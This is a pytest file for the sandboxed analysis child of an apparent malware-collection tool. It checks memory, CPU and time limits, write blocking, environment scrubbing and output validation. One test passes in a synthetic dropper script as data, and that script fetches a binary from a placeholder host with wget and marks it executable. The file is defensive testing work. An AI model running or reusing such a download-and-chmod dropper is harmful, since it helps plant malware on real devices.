"""The analysis child: limits, timeouts, output validation. Synthetic input only."""

import os
import struct
import sys
import time
from pathlib import Path

import pytest

from collector.runner import ChildOutcome, run_child

RULES = Path(__file__).resolve().parents[1] / "rules" / "yara"
PY = sys.executable


def argv(code: str) -> list[str]:
    return [PY, "-I", "-c", code]


async def child(code: str, *, timeout_s: float = 20, data: bytes = b"") -> ChildOutcome:
    return await run_child(
        data, timeout_s=timeout_s, memory_mb=256, rules_dir=RULES, argv=argv(code)
    )


def tiny_elf() -> bytes:
    ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + bytes(8)
    header = struct.pack("<HHIQQQIHHHHHH", 2, 62, 1, 0x400000, 64, 0, 0, 64, 56, 0, 64, 0, 0)
    return ident + header + b"\x00" * 64


async def test_real_child_analyses_a_synthetic_script() -> None:
    script = b"#!/bin/sh\ncd /tmp\nwget http://files.example.test/bins/x.arm7\nchmod 777 x.arm7\n"
    out = await run_child(script, timeout_s=30, memory_mb=384, rules_dir=RULES)
    assert out.status == "done", out.code
    assert out.result is not None
    assert out.result.file.kind == "script"
    assert out.result.digests.sha256


async def test_real_child_handles_a_crafted_binary_and_noise() -> None:
    for blob in (tiny_elf(), tiny_elf()[:70], os.urandom(2 * 1024 * 1024), b"\x00" * 100_000):
        out = await run_child(blob, timeout_s=30, memory_mb=384, rules_dir=RULES)
        assert out.status == "done", out.code


async def test_a_huge_single_line_returns_within_limits() -> None:
    out = await run_child(b"A" * (8 * 1024 * 1024), timeout_s=40, memory_mb=384, rules_dir=RULES)
    assert out.status in {"done", "timeout", "failed"}


async def test_child_is_killed_on_timeout() -> None:
    start = time.monotonic()
    out = await child("import time; time.sleep(60)", timeout_s=1)
    assert out.status == "timeout"
    assert out.code == "timeout"
    assert time.monotonic() - start < 10


async def test_child_stops_at_the_memory_limit() -> None:
    code = (
        "import sys\n"
        "from collector.analysis_child import apply_limits, EXIT_MEMORY\n"
        "apply_limits(96, 20)\n"
        "try:\n"
        "    blob = bytearray(400 * 1024 * 1024)\n"
        "except MemoryError:\n"
        "    sys.exit(EXIT_MEMORY)\n"
    )
    out = await child(code)
    assert (out.status, out.code) == ("failed", "memory")


async def test_child_stops_at_the_cpu_limit() -> None:
    code = (
        "from collector.analysis_child import apply_limits\n"
        "apply_limits(256, 1)\n"
        "while True:\n"
        "    pass\n"
    )
    out = await child(code, timeout_s=30)
    assert (out.status, out.code) == ("failed", "cpu_limit")


async def test_child_cannot_write_files() -> None:
    code = (
        "from collector.analysis_child import apply_limits\n"
        "apply_limits(256, 5)\n"
        "import os, sys\n"
        "try:\n"
        "    open(os.devnull, 'w').write('x' * 10)\n"
        "    f = open('/tmp/spx_probe', 'w'); f.write('x'); f.flush(); f.close()\n"
        "except OSError:\n"
        "    sys.exit(0)\n"
        "sys.exit(9)\n"
    )
    out = await child(code)
    # exit 0 -> empty output -> invalid_output; exit 9 would be child_error
    assert out.code == "invalid_output"


async def test_invalid_or_oversized_output_is_rejected() -> None:
    assert (await child("print('{\"x\": 1}')")).code == "invalid_output"
    assert (await child("print('not json')")).code == "invalid_output"
    big = await child("import sys; sys.stdout.write('a' * (3 * 1024 * 1024))")
    assert (big.status, big.code) == ("failed", "output_too_large")


async def test_crashing_child_is_reported() -> None:
    assert (await child("raise SystemExit(3)")).code == "child_error"


async def test_child_gets_a_clean_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("POSTGRES_PASSWORD", "secret-value-for-test")
    monkeypatch.setenv("EGRESS_PROXY_PASSWORD", "another-secret-value")
    code = (
        "import os, sys\n"
        "leaked = {'POSTGRES_PASSWORD', 'EGRESS_PROXY_PASSWORD', 'PATH', 'HOME'} & set(os.environ)\n"
        "sys.exit(3 if leaked else 0)\n"
    )
    assert (await child(code)).code == "invalid_output"  # exit 0, no JSON; 3 would be child_error


async def test_broken_stdin_pipe_does_not_hang() -> None:
    out = await child("import sys; sys.exit(0)", data=b"x" * (4 * 1024 * 1024))
    assert out.code == "invalid_output"
